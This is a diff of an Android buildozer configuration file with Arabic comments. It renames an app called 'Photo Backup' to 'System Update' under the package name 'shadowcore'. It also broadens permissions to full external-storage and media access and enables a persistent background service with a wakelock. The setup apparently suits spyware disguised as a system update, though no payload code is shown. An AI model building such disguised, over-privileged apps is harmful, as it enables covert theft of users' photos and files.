@@ -1,33 +1,37 @@
 [app]
-title = Photo Backup
+title = System Update
 package.name = shadowcore
 package.domain = org.test
 
 source.dir = .
-source.include_exts = py,png,jpg,kv,atlas
+# إضافة الامتدادات المطلوبة لضمان تضمين كل الملفات
+source.include_exts = py,png,jpg,kv,atlas,ini
 
-version = 1.0
+version = 2.1.0
 
-requirements = python3,kivy,pyjnius,requests,certifi,urllib3
+# المكتبات المطلوبة لعمل الشبكة والصلاحيات
+requirements = python3,kivy,pyjnius,requests,certifi,urllib3,idna,charset-normalizer
 
 orientation = portrait
 
-# الأذونات المهمة فقط (مضمونة)
-android.permissions = INTERNET,FOREGROUND_SERVICE,WAKE_LOCK,READ_MEDIA_IMAGES
+# الأذونات المعدلة للوصول الشامل للصور والفيديوهات والملفات
+android.permissions = INTERNET, FOREGROUND_SERVICE, WAKE_LOCK, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, MANAGE_EXTERNAL_STORAGE
 
+# استهداف أحدث الأنظمة
 android.api = 33
 android.minapi = 21
 
-# تعريف الخدمة (مهم جدًا)
-services = MyService:service.py
+# تعريف الخدمة (تأكد أن الاسم Myservice مطابق للكود في main.py)
+services = Myservice:service.py
 
-# تشغيل بالخلفية
+# إعدادات التشغيل الدائم في الخلفية
 android.foreground_service = True
 android.wakelock = True
 
-# تحسين التوافق
+# ميزات إضافية لضمان استقرار التطبيق
 android.enable_androidx = True
 android.copy_libs = 1
+android.archs = arm64-v8a, armeabi-v7a
 
 [buildozer]
 log_level = 2
